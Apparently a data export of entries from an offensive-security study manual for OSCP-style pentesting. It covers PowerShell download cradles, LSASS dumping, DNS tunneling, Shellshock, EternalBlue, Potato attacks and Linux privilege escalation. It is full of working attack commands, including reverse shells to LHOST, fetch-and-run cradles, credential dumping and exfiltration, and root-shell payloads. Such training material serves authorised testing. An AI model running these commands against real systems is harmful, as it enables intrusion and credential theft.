    powershell -enc <base64-utf16le>          # encoded command (obfuscation / avoid quoting)
Execution policy is **not** a security boundary — `-ep bypass` / piping to iex sidesteps it.

## Download cradles (fetch + run in memory)
    IEX(New-Object Net.WebClient).DownloadString('http://LHOST/s.ps1')
    iwr http://LHOST/s.ps1 -UseBasicParsing | iex
    IEX(IWR http://LHOST/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks
No file touches disk — handy against AV, but AMSI still scans it (av-evasion-basics).

## Cmdlets you'll use
    Get-Process / Get-Service                 # ps / services
    Get-LocalUser / Get-LocalGroupMember Administrators
    Get-ChildItem -Recurse -Filter *.kdbx -ErrorAction SilentlyContinue   # hunt files
    Select-String -Path *.config -Pattern password                        # grep
    Get-Content file ; Set-Content ; Out-File                             # cat / write
    Invoke-WebRequest / Invoke-RestMethod     # curl for APIs
Objects, not text: pipe to `Select-Object`, `Where-Object`, `Format-List`.

## Gotchas
32- vs 64-bit PowerShell (C:\Windows\SysWOW64 vs System32) can matter for some modules; use the
right one. Constrained Language Mode (windows-applocker-amsi) blocks much of this.

## Pattern
"-ep bypass / iex to run, a download cradle to load tools in memory, object-pipeline cmdlets to
enumerate." It's the default post-exploitation shell on Windows. (See: windows-shells,
living-off-the-land.)

entries.title: CI/CD & pipeline secrets
entries.brief: Where modern apps leak credentials: repos, pipelines, containers
entries.body:
## Why this is its own hunt
Modern deployments scatter secrets across source control, pipeline configs, and container images.
A read of any of these often yields cloud keys, DB creds, and deploy tokens — a fast path from
'found a repo' to 'own the infra'.

## Where secrets hide
- **Git history** (not just HEAD): committed-then-removed keys live forever in history
  (git-exposure). Scan with trufflehog/gitleaks.
- **CI config files**: .github/workflows/*.yml, .gitlab-ci.yml, Jenkinsfile, .circleci/ — and the
  **CI variable store** (often printed in build logs).
- **.env / config**: .env, config.json, application.yml, appsettings.json, docker-compose.yml.
- **Container images**: layers + `docker history` leak build-time ARGs/secrets
  (docker-registry-enum); extract and grep.
- **Build artifacts & logs**: pipeline logs frequently echo tokens; artifact stores hold configs.

## Hunt it
    gitleaks detect -s .            # or: trufflehog filesystem ./repo
    grep -rniE 'aws_|secret|token|api[_-]?key|password|BEGIN .*PRIVATE KEY' .
    # in a pipeline you control (CI injection): echo the env to exfil its secrets

## Escalate
A leaked cloud key -> `aws sts get-caller-identity` + loot (cloud-basics). A deploy/registry token
-> push a malicious image or trigger a pipeline -> RCE in the build environment.

## Pattern
"Follow the secrets through the delivery chain: repo history -> CI config/vars -> .env -> image
layers -> logs." Each is a credential store; one key often unlocks the cloud or the deploy path.
(See: git-exposure, cloud-basics, docker-registry-enum.)

entries.title: Kerberos clock skew (the silent AD blocker)
entries.brief: Why your tickets fail until your clock matches the DC
entries.body:
## The gotcha
Kerberos refuses authentication if the client and the KDC (DC) clocks differ by more than ~5
minutes (the default max skew). From Kali this is the #1 reason getTGT/getST/-k tools fail with
cryptic errors like `KRB_AP_ERR_SKEW` or `Clock skew too great`.

## Fix your clock to the DC
    sudo ntpdate <DC-IP>                 # sync to the domain controller
    sudo rdate -n <DC-IP>                # alternative
    sudo timedatectl set-ntp off         # stop NTP fighting your manual set, if needed
    date                                  # confirm

## When you can't change the host clock
    faketime "$(date -d @$(curl -s ...))" impacket-getTGT ...   # run one tool at a fixed time
    # simplest: just ntpdate the DC before Kerberos operations

## Other Kerberos name/case gotchas
- Use the target's **FQDN** and correct case (`cifs/host.corp.local`, not the IP).
- Set the realm/domain correctly; add the DC to /etc/hosts and set /etc/krb5.conf if needed.
- `export KRB5CCNAME=ticket.ccache` before `-k -no-pass` tools.

## Pattern
"Kerberos failing weirdly? Check the clock first." `ntpdate <DC>` so your skew is under 5 minutes,
use FQDNs, and point KRB5CCNAME at your ccache. Most 'my ticket doesn't work' problems are time or
naming, not the attack. (See: kerberos-ticket-formats, pass-the-hash-ticket.)

entries.title: BloodHound: the queries that find the path
entries.brief: Turning the AD graph into an attack route
entries.body:
## After collection, ask the right questions
Once you've imported data (bloodhound-python -c all), BloodHound's value is its **queries** — they
turn thousands of objects into a short attack path. Use the pre-built ones, then Cypher for custom.

## Pre-built queries worth running
- **Shortest Paths to Domain Admins** (from your owned user) — the headline route.
- **Find Principals with DCSync Rights**, **Find Computers with Unconstrained Delegation**.
- **Kerberoastable / AS-REP Roastable users**, **Users with Foreign Group Membership** (trusts).
- Mark nodes you control as **Owned**, then "Shortest paths from Owned principals".

## Useful Cypher snippets
    // what can my user reach (outbound control):
    MATCH p=(u:User {name:"BOB@CORP.LOCAL"})-[r*1..]->(n) RETURN p
    // who can RDP/PSRemote where:
    MATCH p=(u)-[:CanRDP|CanPSRemote]->(c:Computer) RETURN p
    // who can read LAPS:
    MATCH p=(u)-[:ReadLAPSPassword]->(c) RETURN p

## Read the edges
Each edge is an attack: MemberOf, AdminTo, HasSession, GenericAll/Write, WriteDacl, ForceChange-
Password, AddKeyCredentialLink, AllowedToDelegate. Right-click an edge -> **Help** shows the exact
abuse (and often the tool: bloodyAD/certipy/impacket — see ad-acl-abuse).

## Pattern
"Mark Owned -> run Shortest Paths to DA -> walk the edges." Pre-built queries for the common wins,
Cypher for specifics; every edge's Help tells you how to abuse it. (See: ad-acl-abuse,
active-directory-trusts, atlas bloodhound-python.)

entries.title: HTTP parameter pollution (HPP)
entries.brief: Send a parameter twice; different tiers pick different copies, bypassing filters/logic
entries.body:
## The idea
When the same parameter appears multiple times, the WAF, framework and backend may each pick a
DIFFERENT occurrence (first, last, or concatenated). That mismatch bypasses filters and auth logic.

## How parsers differ (know your target)
    # PHP/Apache     -> last value       (?a=1&a=2 => 2)
    # ASP/IIS        -> concatenates     (=> '1,2')
    # Tomcat/Java    -> first value      (=> 1)
    # Node/express   -> array            (=> [1,2])

## Abuse patterns
    # WAF checks the first, backend uses the last:
    ?id=1&id=1 OR 1=1          # WAF sees clean '1', app runs the injection
    # authorization on one copy, action on another:
    ?role=user&role=admin
    # also pollute in body + query at once; and server-side HPP into a forwarded request

## Where it bites
    # SQLi/filter bypass, auth/role confusion, SSRF allowlist bypass, OAuth redirect_uri dup

## Gotchas
- Test which copy each tier honours (add a marker to each) before weaponising.
- Combine with the mass-assignment duplicate-field trick (see password-reset-logic-flaws / idor).
- Also works to smuggle a second value past client-side validation.

entries.title: Open redirect (and what it enables)
entries.brief: Why an unvalidated redirect is more than a low-severity bug
entries.body:
## The root cause
The app redirects to a URL taken from user input without validating it:
    /login?next=/dashboard    ->    change next to an external/arbitrary URL
    GET /redirect?url=https://evil.com    -> 302 Location: https://evil.com

## Why it matters (the chains)
- **Phishing** — a link on the trusted domain that bounces to your page.
- **OAuth/SSO token theft** — if redirect_uri validation is weak, an open redirect on an allowed
  host can **leak the auth code/token** to you (oauth-saml-flaws).
- **SSRF assist / filter bypass** — redirect a server-side fetcher past an allow-list to an
  internal target (ssrf-logic).
- **Credential/referrer leak** — the victim's token in the URL leaks via Referer to your site.

## Find & confirm
    /path?next=https://evil.com   /path?url=//evil.com   /path?redirect=/\evil.com
Watch for a 3xx with `Location:` pointing off-site. Try bypasses: `//evil.com`, `https:evil.com`,
`https://trusted.com@evil.com`, `/%2F%2Fevil.com`, a trailing `.` or `\`.

## Pattern
"Does a redirect target come from my input, unvalidated?" On its own it's phishing; chained, it
steals OAuth tokens or assists SSRF. Test the common param names and host-confusion bypasses. The
fix you bypass is an allow-list of redirect destinations.

entries.title: sshuttle — a poor-man's VPN pivot
entries.brief: Routing whole subnets through an SSH host without proxychains
entries.body:
## What it does
With SSH access to a pivot, **sshuttle** transparently routes chosen subnets through it — like a
VPN — so your tools reach internal hosts **natively** (no proxychains, real packets). Great when
you have SSH creds and want full tooling.

## Use it
    sshuttle -r user@PIVOT 10.10.20.0/24                 # route that subnet via PIVOT
    sshuttle -r user@PIVOT 10.10.20.0/24 10.10.30.0/24    # multiple subnets
    sshuttle -r user@PIVOT 0.0.0.0/0                       # route everything (full tunnel)
    sshuttle -r user@PIVOT --dns 10.10.20.0/24            # also tunnel DNS
Then just run tools against the internal IPs:
    nmap -sT 10.10.20.5 ; evil-winrm -i 10.10.20.7 ...

## vs the alternatives
- **sshuttle** — needs SSH creds + Python on the pivot; cleanest for native tooling over SSH.
- **ssh -D + proxychains** — no Python needed, but TCP-only and you must wrap each tool.
- **chisel/ligolo** — when you have no SSH, just a foothold to run a binary (pivoting-playbook).

## Pattern
"Have SSH on the pivot and want native access to a subnet?" `sshuttle -r user@pivot <subnet>` and
your tools work as if you're on that network. Use `--dns` for name resolution. (See:
pivoting-playbook, port-forwarding.)

entries.title: Dumping LSASS (credentials in memory)
entries.brief: How to get the dump that mimikatz/pypykatz parse
entries.body:
## Why LSASS
The Local Security Authority (lsass.exe) holds credentials of logged-on users — NTLM hashes,
Kerberos tickets, and sometimes plaintext. Dumping its memory (as admin/SYSTEM) and parsing it
yields creds to reuse. Parsing can be done **offline on Kali** (pypykatz), avoiding mimikatz on
the target.

## Get the dump (several LOLBAS ways)
    # comsvcs.dll (built-in, no tool to drop):
    rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass-PID> C:\Temp\lsass.dmp full
    # Sysinternals procdump:
    procdump.exe -accepteula -ma lsass.exe lsass.dmp
    # Task Manager -> lsass.exe -> Create dump file (GUI)
    # nxc does it remotely:
    nxc smb TARGET -u admin -p pass -M lsassy        # or --sam / --lsa for hives
Find the PID: `tasklist /fi "imagename eq lsass.exe"` or `Get-Process lsass`.

## Parse it (offline)
    pypykatz lsa minidump lsass.dmp                   # creds/hashes/tickets, on Kali
    # on the target: mimikatz  sekurlsa::minidump lsass.dmp ; sekurlsa::logonpasswords

## The obstacles
Needs SeDebugPrivilege (admin/SYSTEM). Modern defences: **LSA Protection (RunAsPPL)**, Credential
Guard, and EDR hooks on lsass access — may need a driver/bypass (OSEP territory). Exfil the .dmp
and parse offline to reduce footprint.

## Pattern
"Dump lsass (comsvcs/procdump/lsassy) -> exfil -> pypykatz offline." Admin gets you the dump;
parsing on Kali keeps mimikatz off the box. Mind LSA Protection/Credential Guard. (See: mimikatz,
pass-the-hash-ticket, browser-and-vault-creds.)

entries.title: DNS tunneling (egress of last resort)
entries.brief: Smuggling shells/data over DNS when nothing else is allowed
entries.body:
## When you reach for it
Some networks block all egress except DNS (the host can still resolve names). DNS tunneling encodes
data into DNS queries to a server **you** control (authoritative for a domain), giving you a slow
but working channel for C2 or exfiltration when HTTP/TCP are filtered.

## The setup (conceptual)
You own a domain and run an authoritative server on your box; the target makes lookups like
`<base32-chunk>.tunnel.yourdomain.com`, which reach your server (via the victim's resolver), and
your server answers with encoded data. Two common tools:
- **dnscat2** — DNS C2 with an interactive shell, file transfer, and tunneling.
      # your box (server):   dnscat2-server tunnel.yourdomain.com
      # target (client):     ./dnscat tunnel.yourdomain.com
- **iodine** — a full IP-over-DNS tunnel (a tun interface) for general traffic.
      # your box:  sudo iodined -f -P pass 10.0.0.1 tunnel.yourdomain.com
      # target:    sudo iodine -f -P pass tunnel.yourdomain.com

## Trade-offs
Very **slow** and **noisy** in logs (lots of odd subdomain lookups), and needs a domain with the
right NS delegation. It's a last resort, not a first choice — but it works where everything else is
blocked.

## Pattern
"Only DNS gets out? Tunnel over it." dnscat2 for a DNS C2/shell, iodine for an IP tunnel — both
need a domain delegated to your server. Expect low bandwidth and high detectability. (See:
data-exfiltration.)

entries.title: Scope & rules of engagement
entries.brief: The discipline that keeps testing legal, safe, and in-bounds
entries.body:
## Why this comes first
Every technique in this tool is for systems you **own or are explicitly authorised to test**.
Scope and rules of engagement (RoE) define what's permitted — staying inside them is what separates
a pentest from a crime. On OSCP the 'scope' is the lab/exam network; in real work it's a signed
agreement.

## What scope/RoE usually specify
- **Targets**: exact IPs/ranges/domains **in** scope — and explicitly **out** of scope.
- **Allowed actions**: which techniques are OK (e.g. no DoS, no social engineering, limits on
  Metasploit — like OSCP's one-machine rule), and any no-touch systems.
- **Timing**: the testing window; blackout periods.
- **Data handling**: what you may access/exfiltrate and how to store it; PII rules.
- **Comms & escalation**: who to call if you find something critical or break something; the
  authorisation ('get out of jail') contact.

## Practical discipline
- Verify a host is in scope **before** you touch it; re-check when a pivot reveals new hosts (an
  internal subnet may be out of scope).
- Avoid destructive actions (kernel exploits that crash, mass deauth, data deletion) unless
  explicitly allowed — snapshot where possible.
- Note everything for the report, including what you did **not** do and why (note-taking-reporting).

## Pattern
"Confirm authorisation and scope before acting, and re-confirm as the engagement expands." The
coolest exploit is worthless (and illegal) out of scope. Know the targets, the allowed actions, the
window, and who to call. Authorised testing only — always.

entries.title: Windows privilege escalation — the checklist
entries.brief: The ordered local-enum passes that surface most Windows privesc
entries.body:
## Run in order after a Windows foothold
winPEAS automates this, but know the manual checks so you can verify and work without it.

## The passes
1. **Context** — `whoami /priv`, `whoami /groups`, `whoami`, `hostname`, `systeminfo` (OS/patch).
2. **Token privileges** — SeImpersonate/SeAssignPrimaryToken (-> Potato), SeBackup/SeRestore,
   SeDebug, SeLoadDriver, SeTakeOwnership (windows-token-privesc).
3. **Services** — unquoted paths, weak service perms, writable service binary
   (windows-service-privesc); `accesschk.exe -uwcqv user *`.
4. **Scheduled tasks** — `schtasks /query /fo LIST /v` for SYSTEM tasks you can edit (windows-scheduled-tasks).
5. **Registry** — AlwaysInstallElevated, autoruns/Run keys, stored creds (windows-autoruns-registry).
6. **Credentials** — GPP cpassword (SYSVOL), unattend.xml, Credential Manager, saved RDP/PuTTY,
   PowerShell history, config files (browser-and-vault-creds, windows-gpp-laps).
7. **DLL hijacking** — missing DLLs + writable search path (windows-dll-hijacking).
8. **Installed software/patches** — version -> known exploit; `wmic qfe` for hotfixes.
9. **Kernel** — only after the above: systeminfo -> a matched exploit (e.g. via wesng).

## Tooling
    winPEAS.exe ; PowerUp.ps1 (Invoke-AllChecks) ; Seatbelt.exe ; PrivescCheck.ps1
    accesschk.exe ; wesng (Windows Exploit Suggester NG) for kernel matches.

## Pattern
"Context -> tokens -> services -> tasks -> registry -> creds -> DLL -> software -> kernel." Each
result maps to a technique; tokens (SeImpersonate) and service/task misconfigs are the fast wins.
(See: linux-enum-checklist for the Linux parallel, peass-reading.)

entries.title: The Active Directory kill chain (overview)
entries.brief: How the AD entries fit into one end-to-end path to Domain Admin
entries.body:
## The map (initial access -> Domain Admin)
A mental model tying the AD entries together. Each stage feeds the next.

## 1. Get ANY domain credential
Password spray (password-spraying/kerbrute), AS-REP roast with no creds (GetNPUsers), a web/
service foothold on a domain host, LLMNR/IPv6 poisoning (responder/mitm6), or reused creds.

## 2. Enumerate with that credential
    nxc smb/ldap ... --users --groups --shares --pass-pol        # netexec-workflow
    bloodhound-python -c all ...                                 # then run queries
    ldapdomaindump / enum4linux-ng
Collect: users, groups, SPNs, delegation, ACLs, sessions, trusts.

## 3. Escalate laterally/vertically (pick the edge BloodHound shows)
- **Kerberoast** SPN accounts -> crack (kerberoasting-deep).
- **ACL abuse** (GenericAll/WriteDACL/AddMember/shadow-creds) with bloodyAD/certipy (ad-acl-abuse).
- **AD CS** ESC1/ESC8 -> cert -> TGT (active-directory-adcs).
- **Coercion + relay** (PetitPotam/mitm6 -> ntlmrelayx) (coercion-ntlm-relay, ipv6-mitm6).
- **Delegation** (unconstrained/constrained/RBCD) (kerberos-delegation).
- **Local admin reuse** -> dump SAM/lsass -> new creds -> move (pass-the-hash-ticket, lateral movement).

## 4. Domain dominance & persistence
Reach replication rights -> **DCSync** (secretsdump) -> krbtgt -> **Golden Ticket**; or trust
abuse across the forest (active-directory-trusts, ad-persistence).

## Pattern
"Any cred -> enumerate (BloodHound) -> walk the shortest edge to DA -> DCSync -> persist." Every AD
box is a walk along this graph; the specific entries above are the moves. Sync your clock first
(kerberos-time-skew)!

entries.title: Android APK testing basics
entries.brief: Decompiling, inspecting and intercepting a mobile app
entries.body:
## What an APK is
An Android app is a zip (`.apk`) containing compiled Dalvik bytecode (classes.dex), resources, and
`AndroidManifest.xml`. You attack it like a thick client: read the code, inspect local storage, and
intercept its traffic.

## Static: unpack & decompile
    apktool d app.apk -o app/          # decode resources + manifest + smali
    jadx-gui app.apk                   # decompile to readable Java (best for reading logic)
    unzip app.apk -d apk/ ; strings apk/classes.dex | grep -iE 'http|key|secret'
Hunt: hardcoded API keys/URLs, cert-pinning logic, exported components in the manifest
(`android:exported="true"` activities/services/providers), and backup/debug flags.

## Dynamic: run & intercept
- Run in an emulator (adb) or a rooted device.
    adb install app.apk ; adb logcat | grep -i <app>   # logs often leak tokens
    adb shell run-as <pkg> ls /data/data/<pkg>          # app's private storage (DBs, prefs)
- **Intercept HTTPS**: set a proxy to Burp + install the CA; defeat **cert pinning** with
  **frida**/**objection** (`objection ... android sslpinning disable`).

## Rebuild (to patch a check)
    apktool b app/ -o new.apk ; sign it (apksigner/uber-apk-signer) ; adb install new.apk

## Pattern
"Decompile (jadx/apktool), loot local storage and the manifest, intercept the API (Burp + unpin
with frida/objection), then test the backend like any web app." The client is yours; the real
security must be server-side. (See: thick-client-basics, http-fundamentals.)

entries.title: Vulnerability research (version -> exploit)
entries.brief: Turning a fingerprinted version into a working exploit, methodically
entries.body:
## The method
Enumeration gives you products and **versions**; research turns each into a known vulnerability and
a usable exploit. Be precise and skeptical.

## 1. Identify precisely
Exact product + version + build (and OS/arch). `nmap -sCV`, banners, whatweb, `dpkg -l`/`rpm -qa`,
`systeminfo`. A version that's 'close' matches the wrong exploit.

## 2. Search
    searchsploit <product> <version>          # local Exploit-DB (offline, exam-safe)
    searchsploit -w <product>                  # include web links
Also: Exploit-DB, GitHub, the vendor advisory, NVD/CVE, and PoC blog posts. Map a CVE both ways
(CVE -> exploit, and symptom -> CVE).

## 3. Vet the exploit BEFORE running
- Does the version/OS/arch truly match? Pre-auth or post-auth? Does it need a specific config?
- **Read the code** — never run an unknown payload at yourself or the target. Watch for exploits
  that are trojaned or that attack *you*.

## 4. Adapt & test
Set LHOST/LPORT/target/offsets, refresh shellcode (badchars), fix Python2/3, compile for the target
(exploit-usage, exploit-modification, cross-compiling-exploits). Start a listener, run, read errors, iterate.

## Pattern
"Exact version -> searchsploit/CVE -> vet (match + read) -> adapt -> test." Precision and reading
the code are what separate a working exploit from a crashed box or a self-pwn. (See: searchsploit,
exploit-modification.)

entries.title: Shellshock (CVE-2014-6271)
entries.brief: Why a crafted environment variable gives RCE via bash
entries.body:
## The bug
Vulnerable bash parses function definitions in **environment variables** — and kept executing code
placed *after* the function definition. Any path that passes attacker-controlled data into a bash
environment variable (then invokes bash) = remote code execution.

    env x='() { :;}; echo VULNERABLE' bash -c :     # prints VULNERABLE if bash is vulnerable

## The classic vector: CGI (web)
A CGI script run via bash exposes HTTP headers as environment variables (HTTP_USER_AGENT, etc.).
Poison a header:
    curl -H 'User-Agent: () { :;}; echo; echo; /bin/bash -c "id"' http://TARGET/cgi-bin/status
    # reverse shell:
    curl -H 'User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/LHOST/4444 0>&1' http://TARGET/cgi-bin/x
Find CGI scripts first (gobuster with cgi wordlists; common: /cgi-bin/, .sh/.cgi/.pl).

## Other vectors
DHCP clients, OpenSSH `ForceCommand`/authorized_keys environment, and anything spawning bash with
attacker-influenced env. Detect with `nmap --script http-shellshock`.

## Pattern
"Does attacker data reach a bash env var on a vulnerable bash, then bash runs?" The `() { :;};`
prefix smuggles commands — classically via CGI HTTP headers. Enumerate /cgi-bin/ and test the
User-Agent. (See: command-injection-logic.)

entries.title: TLS/SSL vulnerabilities (Heartbleed & friends)
entries.brief: The notable crypto-transport bugs and how to spot them
entries.body:
## Why scan TLS
Beyond weak ciphers, some TLS bugs leak data or allow decryption. Fingerprint the service's TLS
and match known issues; the cert itself also leaks hostnames.

## The notable ones
- **Heartbleed (CVE-2014-0160)** — OpenSSL heartbeat over-read leaks **server memory** (keys,
  session cookies, creds) to an unauthenticated attacker. High impact.
- **POODLE** (SSLv3 padding), **BEAST** (TLS1.0 CBC), **CRIME/BREACH** (compression) — downgrade/
  oracle attacks on old protocols.
- **ROBOT** (RSA padding oracle), **DROWN** (SSLv2 cross-protocol), **Sweet32** (3DES).
- Weak config: SSLv2/3, TLS1.0/1.1, RC4/3DES, self-signed/expired certs, no forward secrecy.

## Detect
    testssl.sh https://TARGET:443            # comprehensive: protocols, ciphers, all the CVEs
    sslscan TARGET:443 ; nmap --script ssl-heartbleed,ssl-enum-ciphers -p443 TARGET
Heartbleed PoCs dump memory repeatedly — grep the output for cookies/keys.

## Recon value
The certificate's CN/SAN reveal hostnames and internal names (add to /etc/hosts); the issuer/dates
hint at the environment.

## Pattern
"Fingerprint TLS (testssl.sh/sslscan/nmap), match known bugs (Heartbleed = memory leak; old
protocols = downgrade), and read the cert for hostnames." Weak TLS is a finding; Heartbleed is a
data breach. (See: atlas sslscan/testssl.sh, sslscan.)

entries.title: EternalBlue (MS17-010)
entries.brief: The SMBv1 pre-auth RCE that owns unpatched Windows
entries.body:
## The bug
MS17-010 is a set of flaws in **SMBv1** that allow **unauthenticated remote code execution** as
SYSTEM on unpatched Windows (7/2008/2012/XP-era, and some 10/2016). It powered WannaCry/NotPetya —
reliable and devastating, but it can **crash** the target, so use with care and only in scope.

## Detect
    nmap -p445 --script smb-vuln-ms17-010 TARGET
    nxc smb TARGET -u '' -p '' -M ms17-010
    # or check the OS/patch level (systeminfo) if you already have a shell

## Exploit
    # Metasploit (reliable):
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS TARGET; set LHOST tun0; set PAYLOAD windows/x64/meterpreter/reverse_tcp; run
    # Manual/public PoC (OSCP-friendly, MSF-free):
    # AutoBlue-MS17-010 (zzz_exploit / eternal_checker + shellcode) — read it first
Match the exact target build; pick x64/x86 shellcode correctly.

## Cautions
BSOD risk if the target is marginal or the wrong payload is used — snapshot if you can, and
remember OSCP's one-MSF-machine rule. Prefer the manual PoC to stay within that rule where needed.

## Pattern
"Is SMBv1/445 open and unpatched (MS17-010)?" nmap/nxc to confirm, then EternalBlue for SYSTEM —
reliable but crash-prone, so scope and caution matter. (See: smb-enumeration-checklist,
metasploit-basics.)

entries.title: Web application testing — the end-to-end playbook
entries.brief: One ordered flow tying enumeration and the bug classes together
entries.body:
## The loop
Every web target follows the same arc: **map it, fingerprint it, find inputs, test each bug class,
chain to impact.** The individual entries have the depth; this is the order to apply them.

## 1. Map & fingerprint
Content discovery (ffuf/feroxbuster), vhosts, source/comments, tech + versions (whatweb) ->
searchsploit the versions. (web-enum-checklist)

## 2. Identify inputs & auth
List every parameter, header, cookie, upload, and API endpoint (api-and-graphql). Understand the
auth model (sessions/JWT/SSO) — cookies-sessions-jwt, oauth-saml-flaws.

## 3. Test bug classes against each input (source -> sink)
    SQLi (sqli-logic) · NoSQLi · command injection · LFI/RFI (lfi-rfi-logic) ·
    SSTI · XSS (xss-logic) · SSRF (ssrf-logic) · XXE · file upload · IDOR/access control ·
    deserialization · race conditions · request smuggling · open redirect · CORS · HPP.
Map input -> where it's used; if unneutralised, it's a bug (web-source-review for white-box).

## 4. Chain to impact
File read -> creds/source (file-read-primitives); SSRF -> cloud metadata (cloud-basics); XSS ->
session; SQLi -> OS (database-enum). Account takeover via reset/registration (account-takeover-logic).

## 5. Foothold & beyond
RCE (webshell/reverse shell) -> upgrade the shell (shell-tty) -> local privesc (linux/windows
checklists). Document reproducibly (note-taking-reporting).

## Pattern
"Map -> fingerprint -> enumerate inputs -> test every bug class source-to-sink -> chain to impact
-> foothold -> privesc." This is the capstone that orders the web entries in this manual.

entries.title: Potato attacks — turn SeImpersonate into SYSTEM
entries.brief: Why a service account with SeImpersonatePrivilege is one step from SYSTEM
entries.body:
## The privilege that matters
Run `whoami /priv`. If you see **SeImpersonatePrivilege** (or SeAssignPrimaryTokenPrivilege)
**Enabled**, you can almost certainly become SYSTEM. This privilege is held by default by service
accounts: IIS `iis apppool\*`, MSSQL `nt service\mssqlserver`, and anything you land as via a
web/service RCE. It lets a process **impersonate a token handed to it** — the whole family of
"Potato" exploits exists to *trick SYSTEM into handing you its token*.

## The mechanism
1. You force a privileged service (SYSTEM) to **authenticate to a listener you control** on the box.
2. That authentication carries a SYSTEM **token**.
3. With SeImpersonate, your process **impersonates** that token and spawns a command **as SYSTEM**.

The variants differ only in *how* they coerce SYSTEM to connect and *which* local RPC/COM
mechanism they abuse — the payoff is identical.

## Which one to use (pick by Windows version)
    PrintSpoofer.exe -i -c cmd              # modern; abuses the print spooler named pipe
    GodPotato -cmd "cmd /c whoami"          # very broad coverage (2012-2022, Win8-11)
    JuicyPotatoNG.exe -t * -p cmd.exe ...   # when a DCOM path is available
    RoguePotato.exe -r <ATTACKER> -e cmd... # Juicy's successor for patched hosts
    (classic JuicyPotato works on older 2016/10 pre-patch boxes)
Rule of thumb: **try PrintSpoofer first, then GodPotato.** One of the two covers most modern targets.

## Full chain (typical)
    whoami /priv                            # confirm SeImpersonate = Enabled
    # upload your tool (see file-transfer), then:
    PrintSpoofer64.exe -i -c "cmd.exe"      # pops a SYSTEM shell
    # or get a reverse shell as SYSTEM:
    GodPotato -cmd "C:\temp\nc.exe <LHOST> <LPORT> -e cmd.exe"

## Pattern
"SeImpersonate -> coerce SYSTEM auth -> impersonate its token -> SYSTEM." Enumerate it in the
token pass of windows-privesc-checklist; it is the single fastest Windows local win after a
service-account foothold. (See: windows-token-privesc, windows-service-privesc.)

entries.title: LD_PRELOAD / LD_LIBRARY_PATH via sudo
entries.brief: How a preserved linker variable in sudoers turns one allowed command into root
entries.body:
## The two linker variables
Before a dynamically-linked program starts, the loader reads environment variables that tell it
where to find libraries:
- **LD_PRELOAD** — load *this* shared object **first**, before any other. Its functions override
  the real ones. A `constructor` in it runs the moment the program loads.
- **LD_LIBRARY_PATH** — extra directories to search for libraries, checked **before** the system paths.

The kernel strips both for SUID binaries, so they are not a SUID issue — they are a **sudo** issue.

## The misconfiguration
    sudo -l
    # ... env_keep += LD_PRELOAD        <- preserves the var across sudo
    # (user) NOPASSWD: /usr/bin/someprog
`env_keep` tells sudo to **keep** that variable in the elevated environment. So any command you are
allowed to `sudo` will load **your** library as root.

## Exploit — LD_PRELOAD
    cat > /tmp/x.c <<'EOF'
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    void _init(){ unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash -p"); }
    EOF
    gcc -fPIC -shared -o /tmp/x.so /tmp/x.c -nostartfiles
    sudo LD_PRELOAD=/tmp/x.so someprog      # -> root shell

## Exploit — LD_LIBRARY_PATH
If `env_keep += LD_LIBRARY_PATH`: run `ldd someprog` to see a library it loads, compile a malicious
one of that name exporting the same symbol, and point LD_LIBRARY_PATH at your dir.

## Pattern
"sudo -l -> env_keep a linker var -> compile a .so -> sudo runs it as root." Always read the full
`sudo -l` output: `env_keep`, `SETENV`, and `!authenticate` are the tells. (See: library-hijacking,
sudoers-file, su-vs-sudo.)

entries.title: $PATH hijacking — a relative binary call becomes yours
entries.brief: Why a root program that calls a command by name (not full path) is exploitable
entries.body:
## The flaw
When a program runs another command by **name** instead of **absolute path** — e.g. `system("service ...")`
or a script that calls `cat`, `ps`, `curl` without `/bin/` — the shell resolves it through **$PATH**,
left to right. If you can put a directory you control **earlier** in $PATH and drop a malicious file
with that name there, the privileged program runs **your** code.

## How to spot it
- A **SUID** binary or a **sudo**-allowed program: run `strings ./binary` and look for bare command
  names, or `ltrace ./binary` to watch its `system()`/`exec` calls.
- A **root cron** or **service** script that calls commands relatively (see pspy, cron-scheduling).

## Exploit
    strings /usr/local/bin/backup      # reveals:  system("tar -czf ... ")  -> calls `tar` by name
    cd /tmp
    echo '/bin/bash -p' > tar          # our fake 'tar'
    chmod +x tar
    export PATH=/tmp:$PATH             # put our dir first
    /usr/local/bin/backup             # the SUID runs OUR tar as its owner (root)
For a **sudo** case where you keep PATH: `sudo PATH=/tmp:$PATH someprog` only works if SETENV is set;
otherwise abuse a script that itself uses a relative call.

## Related: the SUID-runs-a-shell shortcut
If the binary just calls `system()` with a relative command, this is the classic win. If it uses a
full path, try instead function/env abuse (ld-preload-privesc) or GTFOBins for the exact binary.

## Pattern
"Find a privileged relative call -> prepend a writable dir to $PATH -> plant a same-named script."
The fix (and what to audit) is: privileged code must call commands by **absolute path** and reset
PATH. (See: suid-concept, library-hijacking, wildcard-injection-privesc.)

entries.title: Wildcard injection — filenames become arguments
entries.brief: How a root job running `tar *`, `chown *` or `rsync` in a writable dir is hijacked
entries.body:
## The core idea
When a command runs with a glob like `tar -czf backup.tar.gz *`, the shell expands `*` to **the
filenames in that directory** and passes them as **arguments**. If you can **create files** in that
directory, you can create files **named like command-line options** — and the program will treat
them as flags. This is "wildcard injection" or "argument injection via filenames."

## tar — the classic (checkpoint actions)
A root cron does `cd /opt/backups && tar -czf /tmp/b.tar.gz *`. You drop:
    cd /opt/backups
    echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > sh.sh
    echo "" > '--checkpoint=1'
    echo "" > '--checkpoint-action=exec=sh sh.sh'
When tar expands `*`, those filenames become `--checkpoint` options -> tar runs `sh.sh` as root.
Then: `/tmp/rootbash -p`.

## chown / chmod — the --reference trick
A root job does `chown -R root:root *`. Create a file you own, then a filename
`--reference=yourfile`; chown copies **your file's** owner onto everything. Same idea with
`chmod --reference=...`.

## rsync — -e abuse
`rsync` with `*` and a file named `-e sh script` can trigger command execution via its remote-shell
option.

## How to find it
Watch for root jobs in writable dirs: `pspy`, `cat /etc/crontab`, `ls -la /etc/cron.*`,
`systemctl list-timers`. The vulnerable combo is **root + a glob + a directory you can write to**.

## Pattern
"Root runs cmd with `*` in a writable dir -> plant files named like that cmd's dangerous options."
The defense is `--` before the glob or absolute file lists. (See: cron-scheduling, writable-cron-walkthrough,
path-env-hijacking.)

